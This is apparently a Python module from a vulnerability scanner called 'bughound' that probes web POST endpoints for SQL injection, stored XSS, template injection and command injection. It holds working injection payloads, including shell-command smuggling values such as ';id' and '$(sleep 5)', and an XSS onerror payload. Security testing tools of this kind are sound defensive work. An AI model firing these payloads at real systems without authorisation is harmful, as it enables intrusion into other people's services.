"""POST-based injection engine — tests form, JSON, and multipart endpoints.

Tests POST endpoints for SQLi, stored XSS, SSTI, and RCE using
form-encoded, JSON, and multipart content types. Pure aiohttp.
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import Any
from urllib.parse import urlparse

import aiohttp
import structlog

logger = structlog.get_logger()

_TIMEOUT = aiohttp.ClientTimeout(total=15)
_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

# ---------------------------------------------------------------------------
# Indicators
# ---------------------------------------------------------------------------

_SQLI_ERROR_RE = re.compile(
    r"sql syntax|mysql_|ORA-\d|postgresql|sqlite3|SQLSTATE|microsoft sql|"
    r"unclosed quotation|syntax error at or near|pg_query|mysql_fetch|"
    r"jdbc\.|System\.Data\.SqlClient|mariadb",
    re.I,
)

_SSTI_MARKERS = [
    ("{{7*7}}", "49", "jinja2"),
    ("${7*7}", "49", "freemarker"),
    ("#{7*7}", "49", "ruby_erb"),
    ("<%= 7*7 %>", "49", "erb"),
]

_RCE_INDICATORS = re.compile(r"uid=\d|root:|www-data|/bin/bash|/bin/sh", re.I)

# Unique marker for stored XSS verification
_XSS_MARKER = "bughound_xss_probe_"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


async def _send_post(
    session: aiohttp.ClientSession,
    url: str,
    data: dict[str, str],
    content_type: str = "form",
) -> tuple[int, str, dict[str, str]]:
    """Send POST request with specified content type. Never raises."""
    try:
        kwargs: dict[str, Any] = {
            "headers": {**_HEADERS},
            "ssl": False,
            "timeout": _TIMEOUT,
            "allow_redirects": True,
        }
        if content_type == "json":
            kwargs["json"] = data
        elif content_type == "multipart":
            form = aiohttp.FormData()
            for k, v in data.items():
                form.add_field(k, v)
            kwargs["data"] = form
        else:
            kwargs["data"] = data

        async with session.post(url, **kwargs) as resp:
            body = await resp.text(errors="replace")
            resp_headers = {k: v for k, v in resp.headers.items()}
            return resp.status, body[:50_000], resp_headers
    except Exception:
        return 0, "", {}


def _inject_payload(params: list[str], payload: str) -> dict[str, str]:
    """Build a POST body dict with payload injected into each param."""
    return {p: payload for p in params}


# ---------------------------------------------------------------------------
# POST SQLi Testing
# ---------------------------------------------------------------------------


async def test_post_sqli(
    target_url: str,
    params: list[str],
    content_type: str = "form",
) -> dict[str, Any]:
    """Test POST endpoint for SQL injection."""
    payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "1' AND SLEEP(5)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
    ]

    try:
        async with aiohttp.ClientSession() as session:
            # Baseline
            clean_data = {p: "test" for p in params}
            baseline_status, baseline_body, _ = await _send_post(
                session, target_url, clean_data, content_type,
            )

            for payload in payloads:
                data = _inject_payload(params, payload)
                t_start = time.monotonic()
                status, body, _ = await _send_post(
                    session, target_url, data, content_type,
                )
                elapsed = time.monotonic() - t_start

                if status == 0:
                    continue

                # Time-based detection
                if "SLEEP" in payload or "WAITFOR" in payload:
                    if elapsed > 4:
                        return {
                            "vulnerable": True,
                            "type": "time-based-sqli",
                            "evidence": f"Response delayed {elapsed:.2f}s",
                            "endpoint": target_url,
                            "payload": payload,
                            "content_type": content_type,
                            "params": params,
                        }

                # Error-based detection
                if _SQLI_ERROR_RE.search(body) and not _SQLI_ERROR_RE.search(baseline_body):
                    return {
                        "vulnerable": True,
                        "type": "error-based-sqli",
                        "evidence": body[:500],
                        "endpoint": target_url,
                        "payload": payload,
                        "content_type": content_type,
                        "params": params,
                    }

    except Exception:
        pass

    return {
        "vulnerable": False,
        "endpoint": target_url,
        "params": params,
        "content_type": content_type,
    }


# ---------------------------------------------------------------------------
# Stored XSS Testing
# ---------------------------------------------------------------------------


async def test_stored_xss(
    target_url: str,
    params: list[str],
    verify_urls: list[str] | None = None,
    content_type: str = "form",
) -> dict[str, Any]:
    """Test for stored XSS by posting a unique marker and checking if it persists.

    verify_urls: URLs to check for the marker after posting (e.g., listing pages).
    Falls back to checking the POST response and the target URL via GET.
    """
    import hashlib
    marker_id = hashlib.md5(target_url.encode()).hexdigest()[:8]
    marker = f"{_XSS_MARKER}{marker_id}"
    xss_payload = f'<img src=x onerror=alert("{marker}")>'

    try:
        async with aiohttp.ClientSession() as session:
            # Step 1: POST the XSS payload
            data = {p: xss_payload for p in params}
            status, post_body, _ = await _send_post(
                session, target_url, data, content_type,
            )

            if status == 0:
                return {"vulnerable": False, "endpoint": target_url, "params": params}

            # Step 2: Check if marker appears in POST response (immediate reflection)
            if marker in post_body:
                return {
                    "vulnerable": True,
                    "type": "reflected-xss-via-post",
                    "evidence": "XSS marker reflected in POST response",
                    "endpoint": target_url,
                    "payload": xss_payload,
                    "marker": marker,
                    "params": params,
                }

            # Step 3: Check verify URLs and target URL via GET
            check_urls = list(verify_urls or [])
            check_urls.append(target_url)

            for check_url in check_urls[:5]:
                try:
                    async with session.get(
                        check_url, headers=_HEADERS, ssl=False,
                        timeout=_TIMEOUT, allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        if marker in body:
                            return {
                                "vulnerable": True,
                                "type": "stored-xss",
                                "evidence": f"XSS marker found at {check_url}",
                                "endpoint": target_url,
                                "verify_url": check_url,
                                "payload": xss_payload,
                                "marker": marker,
                                "params": params,
                            }
                except Exception:
                    continue

    except Exception:
        pass

    return {
        "vulnerable": False,
        "endpoint": target_url,
        "params": params,
        "marker": marker,
    }


# ---------------------------------------------------------------------------
# POST SSTI Testing
# ---------------------------------------------------------------------------


async def test_post_ssti(
    target_url: str,
    params: list[str],
    content_type: str = "form",
) -> dict[str, Any]:
    """Test POST endpoint for Server-Side Template Injection."""
    try:
        async with aiohttp.ClientSession() as session:
            # Baseline
            clean_data = {p: "test" for p in params}
            _, baseline_body, _ = await _send_post(
                session, target_url, clean_data, content_type,
            )

            for payload, expected, engine in _SSTI_MARKERS:
                data = _inject_payload(params, payload)
                status, body, _ = await _send_post(
                    session, target_url, data, content_type,
                )

                if status == 0:
                    continue

                if expected in body and expected not in baseline_body:
                    return {
                        "vulnerable": True,
                        "type": "ssti",
                        "template_engine": engine,
                        "evidence": body[:500],
                        "endpoint": target_url,
                        "payload": payload,
                        "content_type": content_type,
                        "params": params,
                    }

    except Exception:
        pass

    return {
        "vulnerable": False,
        "endpoint": target_url,
        "params": params,
        "content_type": content_type,
    }


# ---------------------------------------------------------------------------
# POST RCE Testing
# ---------------------------------------------------------------------------


async def test_post_rce(
    target_url: str,
    params: list[str],
    content_type: str = "form",
) -> dict[str, Any]:
    """Test POST endpoint for command injection."""
    time_payloads = [
        ";sleep 5;",
        "|sleep 5",
        "$(sleep 5)",
        "`sleep 5`",
        "%0asleep 5",
    ]
    output_payloads = [
        ";id",
        "|id",
        "$(id)",
        ";whoami",
    ]

    try:
        async with aiohttp.ClientSession() as session:
            # Baseline timing
            clean_data = {p: "test" for p in params}
            t0 = time.monotonic()
            _, baseline_body, _ = await _send_post(
                session, target_url, clean_data, content_type,
            )
            baseline_time = time.monotonic() - t0

            # Time-based
            for payload in time_payloads:
                data = {p: f"test{payload}" for p in params}
                t_start = time.monotonic()
                status, body, _ = await _send_post(
                    session, target_url, data, content_type,
                )
                elapsed = time.monotonic() - t_start

                if status == 0:
                    continue

                if elapsed > baseline_time + 4:
                    return {
                        "vulnerable": True,
                        "technique": "time-based",
                        "payload": payload,
                        "delay_seconds": round(elapsed, 2),
                        "evidence": f"Response delayed {elapsed:.2f}s vs baseline {baseline_time:.2f}s",
                        "endpoint": target_url,
                        "content_type": content_type,
                        "params": params,
                    }

            # Output-based
            for payload in output_payloads:
                data = {p: f"test{payload}" for p in params}
                status, body, _ = await _send_post(
                    session, target_url, data, content_type,
                )

                if status == 0:
                    continue

                if _RCE_INDICATORS.search(body) and not _RCE_INDICATORS.search(baseline_body):
                    return {
                        "vulnerable": True,
                        "technique": "output-based",
                        "payload": payload,
                        "evidence": body[:500],
                        "endpoint": target_url,
                        "content_type": content_type,
                        "params": params,
                    }

    except Exception:
        pass

    return {
        "vulnerable": False,
        "endpoint": target_url,
        "params": params,
        "content_type": content_type,
    }
